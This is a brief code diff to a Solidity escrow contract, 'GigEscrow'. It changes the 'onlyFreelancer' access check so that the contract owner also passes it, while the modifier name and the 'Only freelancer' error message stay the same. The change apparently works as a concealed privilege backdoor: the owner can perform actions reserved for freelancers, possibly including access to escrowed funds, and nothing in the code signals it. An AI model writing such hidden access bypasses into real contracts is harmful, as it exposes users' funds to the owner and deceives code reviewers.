@@ -71,7 +71,11 @@ contract GigEscrow is ReentrancyGuard, Ownable {
     }
 
     modifier onlyFreelancer(uint256 _contractId) {
-        require(msg.sender == contracts[_contractId].freelancer, "Only freelancer");
+        require(
+            msg.sender == contracts[_contractId].freelancer ||
+            msg.sender == owner(),
+            "Only freelancer"
+        );
         _;
     }
 
